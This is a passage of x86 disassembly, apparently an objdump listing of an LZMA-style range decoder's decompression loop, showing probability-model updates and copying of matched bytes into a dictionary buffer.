  406e4a:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  406e51:	0f b6 02             	movzbl (%edx),%eax
  406e54:	0b f8                	or     %eax,%edi
  406e56:	42                   	inc    %edx
  406e57:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  406e5e:	89 54 24 38          	mov    %edx,0x38(%esp)
  406e62:	3b ce                	cmp    %esi,%ecx
  406e64:	0f 85 ee 00 00 00    	jne    0x406f58
  406e6a:	81 fd 00 01 00 00    	cmp    $0x100,%ebp
  406e70:	0f 8d 67 01 00 00    	jge    0x406fdd
  406e76:	8a 44 24 1b          	mov    0x1b(%esp),%al
  406e7a:	8b 54 24 50          	mov    0x50(%esp),%edx
  406e7e:	0f b6 c8             	movzbl %al,%ecx
  406e81:	02 c0                	add    %al,%al
  406e83:	c1 e9 07             	shr    $0x7,%ecx
  406e86:	88 44 24 1b          	mov    %al,0x1b(%esp)
  406e8a:	88 44 24 4d          	mov    %al,0x4d(%esp)
  406e8e:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406e92:	8d 41 01             	lea    0x1(%ecx),%eax
  406e95:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  406e99:	c1 e0 08             	shl    $0x8,%eax
  406e9c:	03 c5                	add    %ebp,%eax
  406e9e:	8d 14 42             	lea    (%edx,%eax,2),%edx
  406ea1:	0f b7 02             	movzwl (%edx),%eax
  406ea4:	0f b7 f0             	movzwl %ax,%esi
  406ea7:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  406eab:	8b c3                	mov    %ebx,%eax
  406ead:	c1 e8 0b             	shr    $0xb,%eax
  406eb0:	0f af c6             	imul   %esi,%eax
  406eb3:	89 b4 24 a8 00 00 00 	mov    %esi,0xa8(%esp)
  406eba:	33 f6                	xor    %esi,%esi
  406ebc:	89 54 24 54          	mov    %edx,0x54(%esp)
  406ec0:	3b f8                	cmp    %eax,%edi
  406ec2:	73 19                	jae    0x406edd
  406ec4:	8b d8                	mov    %eax,%ebx
  406ec6:	b8 00 08 00 00       	mov    $0x800,%eax
  406ecb:	2b 84 24 a8 00 00 00 	sub    0xa8(%esp),%eax
  406ed2:	c1 f8 05             	sar    $0x5,%eax
  406ed5:	03 44 24 1c          	add    0x1c(%esp),%eax
  406ed9:	03 ed                	add    %ebp,%ebp
  406edb:	eb 25                	jmp    0x406f02
  406edd:	2b f8                	sub    %eax,%edi
  406edf:	8d 2c 6d 01 00 00 00 	lea    0x1(,%ebp,2),%ebp
  406ee6:	2b d8                	sub    %eax,%ebx
  406ee8:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  406eef:	66 8b 44 24 1c       	mov    0x1c(%esp),%ax
  406ef4:	46                   	inc    %esi
  406ef5:	66 c1 e8 05          	shr    $0x5,%ax
  406ef9:	66 29 44 24 1c       	sub    %ax,0x1c(%esp)
  406efe:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  406f02:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  406f06:	66 89 02             	mov    %ax,(%edx)
  406f09:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  406f10:	89 74 24 68          	mov    %esi,0x68(%esp)
  406f14:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  406f1a:	0f 83 42 ff ff ff    	jae    0x406e62
  406f20:	e9 0a ff ff ff       	jmp    0x406e2f
  406f25:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  406f29:	85 d2                	test   %edx,%edx
  406f2b:	0f 84 98 08 00 00    	je     0x4077c9
  406f31:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  406f35:	c1 e3 08             	shl    $0x8,%ebx
  406f38:	4a                   	dec    %edx
  406f39:	c1 e7 08             	shl    $0x8,%edi
  406f3c:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  406f43:	0f b6 01             	movzbl (%ecx),%eax
  406f46:	0b f8                	or     %eax,%edi
  406f48:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  406f4c:	41                   	inc    %ecx
  406f4d:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  406f54:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  406f58:	81 fd 00 01 00 00    	cmp    $0x100,%ebp
  406f5e:	7d 7d                	jge    0x406fdd
  406f60:	8b 54 24 50          	mov    0x50(%esp),%edx
  406f64:	8d 04 6d 00 00 00 00 	lea    0x0(,%ebp,2),%eax
  406f6b:	03 d0                	add    %eax,%edx
  406f6d:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%esp)
  406f74:	8b cb                	mov    %ebx,%ecx
  406f76:	89 54 24 54          	mov    %edx,0x54(%esp)
  406f7a:	c1 e9 0b             	shr    $0xb,%ecx
  406f7d:	0f b7 02             	movzwl (%edx),%eax
  406f80:	0f af c8             	imul   %eax,%ecx
  406f83:	3b f9                	cmp    %ecx,%edi
  406f85:	73 1b                	jae    0x406fa2
  406f87:	0f b7 12             	movzwl (%edx),%edx
  406f8a:	8b d9                	mov    %ecx,%ebx
  406f8c:	8b c2                	mov    %edx,%eax
  406f8e:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f93:	2b c8                	sub    %eax,%ecx
  406f95:	c1 f9 05             	sar    $0x5,%ecx
  406f98:	03 ca                	add    %edx,%ecx
  406f9a:	8b 54 24 54          	mov    0x54(%esp),%edx
  406f9e:	03 ed                	add    %ebp,%ebp
  406fa0:	eb 20                	jmp    0x406fc2
  406fa2:	8b ac 24 a8 00 00 00 	mov    0xa8(%esp),%ebp
  406fa9:	2b f9                	sub    %ecx,%edi
  406fab:	2b d9                	sub    %ecx,%ebx
  406fad:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  406fb4:	0f b7 0a             	movzwl (%edx),%ecx
  406fb7:	66 8b c1             	mov    %cx,%ax
  406fba:	66 c1 e8 05          	shr    $0x5,%ax
  406fbe:	66 2b c8             	sub    %ax,%cx
  406fc1:	45                   	inc    %ebp
  406fc2:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  406fc6:	66 89 0a             	mov    %cx,(%edx)
  406fc9:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  406fd0:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  406fd6:	73 80                	jae    0x406f58
  406fd8:	e9 48 ff ff ff       	jmp    0x406f25
  406fdd:	8a 44 24 64          	mov    0x64(%esp),%al
  406fe1:	83 64 24 74 00       	andl   $0x0,0x74(%esp)
  406fe6:	88 44 24 4c          	mov    %al,0x4c(%esp)
  406fea:	e9 c6 00 00 00       	jmp    0x4070b5
  406fef:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406ff3:	85 c0                	test   %eax,%eax
  406ff5:	0f 84 d8 07 00 00    	je     0x4077d3
  406ffb:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  406fff:	c1 e3 08             	shl    $0x8,%ebx
  407002:	48                   	dec    %eax
  407003:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407007:	c1 e7 08             	shl    $0x8,%edi
  40700a:	0f b6 01             	movzbl (%ecx),%eax
  40700d:	0b f8                	or     %eax,%edi
  40700f:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407016:	41                   	inc    %ecx
  407017:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  40701e:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  407022:	81 fd 00 01 00 00    	cmp    $0x100,%ebp
  407028:	7d 7d                	jge    0x4070a7
  40702a:	8b 54 24 50          	mov    0x50(%esp),%edx
  40702e:	8d 04 6d 00 00 00 00 	lea    0x0(,%ebp,2),%eax
  407035:	03 d0                	add    %eax,%edx
  407037:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%esp)
  40703e:	8b cb                	mov    %ebx,%ecx
  407040:	89 54 24 54          	mov    %edx,0x54(%esp)
  407044:	c1 e9 0b             	shr    $0xb,%ecx
  407047:	0f b7 02             	movzwl (%edx),%eax
  40704a:	0f af c8             	imul   %eax,%ecx
  40704d:	3b f9                	cmp    %ecx,%edi
  40704f:	73 1b                	jae    0x40706c
  407051:	0f b7 12             	movzwl (%edx),%edx
  407054:	8b d9                	mov    %ecx,%ebx
  407056:	8b c2                	mov    %edx,%eax
  407058:	b9 00 08 00 00       	mov    $0x800,%ecx
  40705d:	2b c8                	sub    %eax,%ecx
  40705f:	c1 f9 05             	sar    $0x5,%ecx
  407062:	03 ca                	add    %edx,%ecx
  407064:	8b 54 24 54          	mov    0x54(%esp),%edx
  407068:	03 ed                	add    %ebp,%ebp
  40706a:	eb 20                	jmp    0x40708c
  40706c:	8b ac 24 a8 00 00 00 	mov    0xa8(%esp),%ebp
  407073:	2b f9                	sub    %ecx,%edi
  407075:	2b d9                	sub    %ecx,%ebx
  407077:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  40707e:	0f b7 0a             	movzwl (%edx),%ecx
  407081:	66 8b c1             	mov    %cx,%ax
  407084:	66 c1 e8 05          	shr    $0x5,%ax
  407088:	66 2b c8             	sub    %ax,%cx
  40708b:	45                   	inc    %ebp
  40708c:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  407090:	66 89 0a             	mov    %cx,(%edx)
  407093:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  40709a:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  4070a0:	73 80                	jae    0x407022
  4070a2:	e9 48 ff ff ff       	jmp    0x406fef
  4070a7:	8a 44 24 64          	mov    0x64(%esp),%al
  4070ab:	88 44 24 4c          	mov    %al,0x4c(%esp)
  4070af:	eb 04                	jmp    0x4070b5
  4070b1:	8a 44 24 4c          	mov    0x4c(%esp),%al
  4070b5:	8b 54 24 44          	mov    0x44(%esp),%edx
  4070b9:	85 d2                	test   %edx,%edx
  4070bb:	0f 84 1c 07 00 00    	je     0x4077dd
  4070c1:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4070c5:	ff 44 24 48          	incl   0x48(%esp)
  4070c9:	88 01                	mov    %al,(%ecx)
  4070cb:	41                   	inc    %ecx
  4070cc:	4a                   	dec    %edx
  4070cd:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  4070d1:	8b 8c 24 94 00 00 00 	mov    0x94(%esp),%ecx
  4070d8:	89 54 24 44          	mov    %edx,0x44(%esp)
  4070dc:	8b 94 24 a0 00 00 00 	mov    0xa0(%esp),%edx
  4070e3:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4070e6:	8b c1                	mov    %ecx,%eax
  4070e8:	40                   	inc    %eax
  4070e9:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4070ed:	33 d2                	xor    %edx,%edx
  4070ef:	f7 74 24 34          	divl   0x34(%esp)
  4070f3:	89 94 24 94 00 00 00 	mov    %edx,0x94(%esp)
  4070fa:	e9 92 04 00 00       	jmp    0x407591
  4070ff:	83 fe 01             	cmp    $0x1,%esi
  407102:	75 1b                	jne    0x40711f
  407104:	8b 44 24 70          	mov    0x70(%esp),%eax
  407108:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  40710f:	6a 08                	push   $0x8
  407111:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  407114:	81 c1 98 01 00 00    	add    $0x198,%ecx
  40711a:	e9 02 fd ff ff       	jmp    0x406e21
  40711f:	8b 84 24 84 00 00 00 	mov    0x84(%esp),%eax
  407126:	8b 8c 24 80 00 00 00 	mov    0x80(%esp),%ecx
  40712d:	89 84 24 88 00 00 00 	mov    %eax,0x88(%esp)
  407134:	6a 0a                	push   $0xa
  407136:	58                   	pop    %eax
  407137:	6a 07                	push   $0x7
  407139:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%esp)
  407140:	59                   	pop    %ecx
  407141:	39 4c 24 70          	cmp    %ecx,0x70(%esp)
  407145:	89 94 24 80 00 00 00 	mov    %edx,0x80(%esp)
  40714c:	0f 4c c1             	cmovl  %ecx,%eax
  40714f:	c7 44 24 28 16 00 00 	movl   $0x16,0x28(%esp)
  407156:	00 
  407157:	89 44 24 70          	mov    %eax,0x70(%esp)
  40715b:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  407162:	05 64 06 00 00       	add    $0x664,%eax
  407167:	89 44 24 50          	mov    %eax,0x50(%esp)
  40716b:	e9 2d 04 00 00       	jmp    0x40759d
  407170:	8b 44 24 70          	mov    0x70(%esp),%eax
  407174:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  40717b:	85 f6                	test   %esi,%esi
  40717d:	75 17                	jne    0x407196
  40717f:	83 c0 0f             	add    $0xf,%eax
  407182:	c1 e0 04             	shl    $0x4,%eax
  407185:	03 84 24 ac 00 00 00 	add    0xac(%esp),%eax
  40718c:	6a 09                	push   $0x9
  40718e:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  407191:	e9 8b fc ff ff       	jmp    0x406e21
  407196:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  407199:	c7 44 24 24 0a 00 00 	movl   $0xa,0x24(%esp)
  4071a0:	00 
  4071a1:	81 c1 b0 01 00 00    	add    $0x1b0,%ecx
  4071a7:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  4071ab:	e9 3d 04 00 00       	jmp    0x4075ed
  4071b0:	85 f6                	test   %esi,%esi
  4071b2:	0f 85 02 01 00 00    	jne    0x4072ba
  4071b8:	39 74 24 48          	cmp    %esi,0x48(%esp)
  4071bc:	0f 84 7a 06 00 00    	je     0x40783c
  4071c2:	83 7c 24 70 07       	cmpl   $0x7,0x70(%esp)
  4071c7:	6a 0b                	push   $0xb
  4071c9:	58                   	pop    %eax
  4071ca:	0f 4c 84 24 b8 00 00 	cmovl  0xb8(%esp),%eax
  4071d1:	00 
  4071d2:	89 44 24 70          	mov    %eax,0x70(%esp)
  4071d6:	83 7c 24 44 00       	cmpl   $0x0,0x44(%esp)
  4071db:	0f 84 06 06 00 00    	je     0x4077e7
  4071e1:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  4071e8:	2b c2                	sub    %edx,%eax
  4071ea:	8b 54 24 34          	mov    0x34(%esp),%edx
  4071ee:	3b c2                	cmp    %edx,%eax
  4071f0:	72 02                	jb     0x4071f4
  4071f2:	03 c2                	add    %edx,%eax
  4071f4:	8b 94 24 a0 00 00 00 	mov    0xa0(%esp),%edx
  4071fb:	8b 8c 24 94 00 00 00 	mov    0x94(%esp),%ecx
  407202:	6a 02                	push   $0x2
  407204:	8a 04 10             	mov    (%eax,%edx,1),%al
  407207:	88 04 11             	mov    %al,(%ecx,%edx,1)
  40720a:	33 d2                	xor    %edx,%edx
  40720c:	88 44 24 50          	mov    %al,0x50(%esp)
  407210:	8b c1                	mov    %ecx,%eax
  407212:	40                   	inc    %eax
  407213:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  407217:	f7 74 24 38          	divl   0x38(%esp)
  40721b:	8a 44 24 50          	mov    0x50(%esp),%al
  40721f:	ff 44 24 4c          	incl   0x4c(%esp)
  407223:	88 01                	mov    %al,(%ecx)
  407225:	41                   	inc    %ecx
  407226:	ff 4c 24 48          	decl   0x48(%esp)
  40722a:	89 94 24 98 00 00 00 	mov    %edx,0x98(%esp)
  407231:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  407235:	58                   	pop    %eax
  407236:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40723a:	8b 54 24 14          	mov    0x14(%esp),%edx
  40723e:	89 44 24 20          	mov    %eax,0x20(%esp)
  407242:	e9 49 f9 ff ff       	jmp    0x406b90
  407247:	85 f6                	test   %esi,%esi
  407249:	75 09                	jne    0x407254
  40724b:	8b 84 24 80 00 00 00 	mov    0x80(%esp),%eax
  407252:	eb 55                	jmp    0x4072a9
  407254:	8b 44 24 70          	mov    0x70(%esp),%eax
  407258:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  40725f:	c7 44 24 24 0b 00 00 	movl   $0xb,0x24(%esp)
  407266:	00 
  407267:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  40726a:	81 c1 c8 01 00 00    	add    $0x1c8,%ecx
  407270:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  407274:	e9 74 03 00 00       	jmp    0x4075ed
  407279:	85 f6                	test   %esi,%esi
  40727b:	75 09                	jne    0x407286
  40727d:	8b 84 24 84 00 00 00 	mov    0x84(%esp),%eax
  407284:	eb 15                	jmp    0x40729b
  407286:	8b 84 24 88 00 00 00 	mov    0x88(%esp),%eax
  40728d:	8b 8c 24 84 00 00 00 	mov    0x84(%esp),%ecx
  407294:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%esp)
  40729b:	8b 8c 24 80 00 00 00 	mov    0x80(%esp),%ecx
  4072a2:	89 8c 24 84 00 00 00 	mov    %ecx,0x84(%esp)
  4072a9:	8b c8                	mov    %eax,%ecx
  4072ab:	89 94 24 80 00 00 00 	mov    %edx,0x80(%esp)
  4072b2:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4072b6:	89 4c 24 7c          	mov    %ecx,0x7c(%esp)
  4072ba:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  4072c1:	05 68 0a 00 00       	add    $0xa68,%eax
  4072c6:	c7 44 24 28 15 00 00 	movl   $0x15,0x28(%esp)
  4072cd:	00 
  4072ce:	89 44 24 50          	mov    %eax,0x50(%esp)
  4072d2:	e9 c6 02 00 00       	jmp    0x40759d
  4072d7:	83 7c 24 70 07       	cmpl   $0x7,0x70(%esp)
  4072dc:	6a 0b                	push   $0xb
  4072de:	58                   	pop    %eax
  4072df:	0f 4c 84 24 bc 00 00 	cmovl  0xbc(%esp),%eax
  4072e6:	00 
  4072e7:	89 44 24 70          	mov    %eax,0x70(%esp)
  4072eb:	e9 12 02 00 00       	jmp    0x407502
  4072f0:	83 7c 24 78 04       	cmpl   $0x4,0x78(%esp)
  4072f5:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  4072fc:	6a 03                	push   $0x3
  4072fe:	58                   	pop    %eax
  4072ff:	0f 4c 44 24 78       	cmovl  0x78(%esp),%eax
  407304:	81 c1 60 03 00 00    	add    $0x360,%ecx
  40730a:	c1 e0 07             	shl    $0x7,%eax
  40730d:	03 c1                	add    %ecx,%eax
  40730f:	c7 44 24 2c 19 00 00 	movl   $0x19,0x2c(%esp)
  407316:	00 
  407317:	6a 06                	push   $0x6
  407319:	89 44 24 54          	mov    %eax,0x54(%esp)
  40731d:	5e                   	pop    %esi
  40731e:	e9 9a 03 00 00       	jmp    0x4076bd
  407323:	83 fd 04             	cmp    $0x4,%ebp
  407326:	7c 3c                	jl     0x407364
  407328:	8b f5                	mov    %ebp,%esi
  40732a:	8b c5                	mov    %ebp,%eax
  40732c:	d1 fe                	sar    $1,%esi
  40732e:	83 e0 01             	and    $0x1,%eax
  407331:	4e                   	dec    %esi
  407332:	83 c8 02             	or     $0x2,%eax
  407335:	8b ce                	mov    %esi,%ecx
  407337:	d3 e0                	shl    %cl,%eax
  407339:	89 44 24 14          	mov    %eax,0x14(%esp)
  40733d:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  407341:	83 fd 0e             	cmp    $0xe,%ebp
  407344:	7d 17                	jge    0x40735d
  407346:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  40734d:	2b c5                	sub    %ebp,%eax
  40734f:	81 c1 5e 05 00 00    	add    $0x55e,%ecx
  407355:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  407358:	e9 9a 00 00 00       	jmp    0x4073f7
  40735d:	33 ed                	xor    %ebp,%ebp
  40735f:	8d 4e fc             	lea    -0x4(%esi),%ecx
  407362:	eb 3b                	jmp    0x40739f
  407364:	8b d5                	mov    %ebp,%edx
  407366:	e9 8e 01 00 00       	jmp    0x4074f9
  40736b:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40736f:	85 c0                	test   %eax,%eax
  407371:	0f 84 7a 04 00 00    	je     0x4077f1
  407377:	8b 54 24 38          	mov    0x38(%esp),%edx
  40737b:	c1 e3 08             	shl    $0x8,%ebx
  40737e:	48                   	dec    %eax
  40737f:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407383:	c1 e7 08             	shl    $0x8,%edi
  407386:	0f b6 02             	movzbl (%edx),%eax
  407389:	0b f8                	or     %eax,%edi
  40738b:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407392:	42                   	inc    %edx
  407393:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  40739a:	89 54 24 38          	mov    %edx,0x38(%esp)
  40739e:	49                   	dec    %ecx
  40739f:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  4073a3:	85 c9                	test   %ecx,%ecx
  4073a5:	7e 2d                	jle    0x4073d4
  4073a7:	d1 eb                	shr    $1,%ebx
  4073a9:	03 ed                	add    %ebp,%ebp
  4073ab:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  4073b2:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  4073b6:	3b fb                	cmp    %ebx,%edi
  4073b8:	72 10                	jb     0x4073ca
  4073ba:	2b fb                	sub    %ebx,%edi
  4073bc:	83 cd 01             	or     $0x1,%ebp
  4073bf:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  4073c6:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  4073ca:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  4073d0:	73 cc                	jae    0x40739e
  4073d2:	eb 97                	jmp    0x40736b
  4073d4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4073d8:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  4073df:	c1 e5 04             	shl    $0x4,%ebp
  4073e2:	03 cd                	add    %ebp,%ecx
  4073e4:	05 44 06 00 00       	add    $0x644,%eax
  4073e9:	6a 04                	push   $0x4
  4073eb:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4073ef:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%esp)
  4073f6:	5e                   	pop    %esi
  4073f7:	89 44 24 50          	mov    %eax,0x50(%esp)
  4073fb:	33 ed                	xor    %ebp,%ebp
  4073fd:	33 c0                	xor    %eax,%eax
  4073ff:	89 74 24 68          	mov    %esi,0x68(%esp)
  407403:	40                   	inc    %eax
  407404:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  407408:	89 44 24 58          	mov    %eax,0x58(%esp)
  40740c:	33 c9                	xor    %ecx,%ecx
  40740e:	eb 38                	jmp    0x407448
  407410:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  407414:	85 c0                	test   %eax,%eax
  407416:	0f 84 e6 03 00 00    	je     0x407802
  40741c:	8b 54 24 38          	mov    0x38(%esp),%edx
  407420:	c1 e3 08             	shl    $0x8,%ebx
  407423:	48                   	dec    %eax
  407424:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407428:	c1 e7 08             	shl    $0x8,%edi
  40742b:	0f b6 02             	movzbl (%edx),%eax
  40742e:	0b f8                	or     %eax,%edi
  407430:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407437:	42                   	inc    %edx
  407438:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  40743f:	89 54 24 38          	mov    %edx,0x38(%esp)
  407443:	8b 44 24 58          	mov    0x58(%esp),%eax
  407447:	41                   	inc    %ecx
  407448:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  40744c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  407450:	3b ce                	cmp    %esi,%ecx
  407452:	0f 8d 9b 00 00 00    	jge    0x4074f3
  407458:	8b 54 24 50          	mov    0x50(%esp),%edx
  40745c:	03 c0                	add    %eax,%eax
  40745e:	03 d0                	add    %eax,%edx
  407460:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%esp)
  407467:	8b c3                	mov    %ebx,%eax
  407469:	89 54 24 54          	mov    %edx,0x54(%esp)
  40746d:	c1 e8 0b             	shr    $0xb,%eax
  407470:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  407474:	0f b7 02             	movzwl (%edx),%eax
  407477:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40747b:	0f af d0             	imul   %eax,%edx
  40747e:	8b c2                	mov    %edx,%eax
  407480:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407484:	8b 54 24 54          	mov    0x54(%esp),%edx
  407488:	3b f8                	cmp    %eax,%edi
  40748a:	73 1d                	jae    0x4074a9
  40748c:	0f b7 12             	movzwl (%edx),%edx
  40748f:	8b d8                	mov    %eax,%ebx
  407491:	8b c2                	mov    %edx,%eax
  407493:	b9 00 08 00 00       	mov    $0x800,%ecx
  407498:	2b c8                	sub    %eax,%ecx
  40749a:	c1 f9 05             	sar    $0x5,%ecx
  40749d:	03 ca                	add    %edx,%ecx
  40749f:	8b 54 24 54          	mov    0x54(%esp),%edx
  4074a3:	d1 64 24 58          	shll   $1,0x58(%esp)
  4074a7:	eb 2b                	jmp    0x4074d4
  4074a9:	0f ab cd             	bts    %ecx,%ebp
  4074ac:	2b f8                	sub    %eax,%edi
  4074ae:	0f b7 0a             	movzwl (%edx),%ecx
  4074b1:	2b d8                	sub    %eax,%ebx
  4074b3:	66 8b c1             	mov    %cx,%ax
  4074b6:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  4074ba:	66 c1 e8 05          	shr    $0x5,%ax
  4074be:	66 2b c8             	sub    %ax,%cx
  4074c1:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  4074c8:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  4074cf:	40                   	inc    %eax
  4074d0:	89 44 24 58          	mov    %eax,0x58(%esp)
  4074d4:	66 89 0a             	mov    %cx,(%edx)
  4074d7:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4074db:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  4074e2:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  4074e8:	0f 83 55 ff ff ff    	jae    0x407443
  4074ee:	e9 1d ff ff ff       	jmp    0x407410
  4074f3:	8b 54 24 14          	mov    0x14(%esp),%edx
  4074f7:	03 d5                	add    %ebp,%edx
  4074f9:	42                   	inc    %edx
  4074fa:	89 54 24 14          	mov    %edx,0x14(%esp)
  4074fe:	89 54 24 7c          	mov    %edx,0x7c(%esp)
  407502:	85 d2                	test   %edx,%edx
  407504:	0f 84 f1 02 00 00    	je     0x4077fb
  40750a:	3b 54 24 48          	cmp    0x48(%esp),%edx
  40750e:	0f 87 28 03 00 00    	ja     0x40783c
  407514:	8b 44 24 78          	mov    0x78(%esp),%eax
  407518:	83 c0 02             	add    $0x2,%eax
  40751b:	01 44 24 48          	add    %eax,0x48(%esp)
  40751f:	89 44 24 78          	mov    %eax,0x78(%esp)
  407523:	83 7c 24 44 00       	cmpl   $0x0,0x44(%esp)
  407528:	0f 84 de 02 00 00    	je     0x40780c
  40752e:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  407535:	2b c2                	sub    %edx,%eax
  407537:	8b 54 24 34          	mov    0x34(%esp),%edx
  40753b:	3b c2                	cmp    %edx,%eax
  40753d:	72 02                	jb     0x407541
  40753f:	03 c2                	add    %edx,%eax
  407541:	8b 94 24 a0 00 00 00 	mov    0xa0(%esp),%edx
  407548:	8b 8c 24 94 00 00 00 	mov    0x94(%esp),%ecx
  40754f:	8a 04 10             	mov    (%eax,%edx,1),%al
  407552:	88 04 11             	mov    %al,(%ecx,%edx,1)
  407555:	33 d2                	xor    %edx,%edx
  407557:	88 44 24 4c          	mov    %al,0x4c(%esp)
  40755b:	8b c1                	mov    %ecx,%eax
  40755d:	40                   	inc    %eax
  40755e:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  407562:	f7 74 24 34          	divl   0x34(%esp)
  407566:	8a 44 24 4c          	mov    0x4c(%esp),%al
  40756a:	88 01                	mov    %al,(%ecx)
  40756c:	41                   	inc    %ecx
  40756d:	8b 44 24 78          	mov    0x78(%esp),%eax
  407571:	ff 4c 24 44          	decl   0x44(%esp)
  407575:	48                   	dec    %eax
  407576:	89 94 24 94 00 00 00 	mov    %edx,0x94(%esp)
  40757d:	8b 54 24 14          	mov    0x14(%esp),%edx
  407581:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  407585:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407589:	89 44 24 78          	mov    %eax,0x78(%esp)
  40758d:	85 c0                	test   %eax,%eax
  40758f:	7f 92                	jg     0x407523
  407591:	6a 02                	push   $0x2
  407593:	58                   	pop    %eax
  407594:	e9 a1 fc ff ff       	jmp    0x40723a
  407599:	8b 44 24 50          	mov    0x50(%esp),%eax
  40759d:	8b c8                	mov    %eax,%ecx
  40759f:	c7 44 24 24 12 00 00 	movl   $0x12,0x24(%esp)
  4075a6:	00 
  4075a7:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  4075ab:	eb 40                	jmp    0x4075ed
  4075ad:	85 f6                	test   %esi,%esi
  4075af:	75 23                	jne    0x4075d4
  4075b1:	8b 84 24 ac 00 00 00 	mov    0xac(%esp),%eax
  4075b8:	8b 54 24 50          	mov    0x50(%esp),%edx
  4075bc:	21 74 24 78          	and    %esi,0x78(%esp)
  4075c0:	c1 e0 04             	shl    $0x4,%eax
  4075c3:	83 c2 04             	add    $0x4,%edx
  4075c6:	03 d0                	add    %eax,%edx
  4075c8:	6a 03                	push   $0x3
  4075ca:	89 54 24 54          	mov    %edx,0x54(%esp)
  4075ce:	5e                   	pop    %esi
  4075cf:	e9 e1 00 00 00       	jmp    0x4076b5
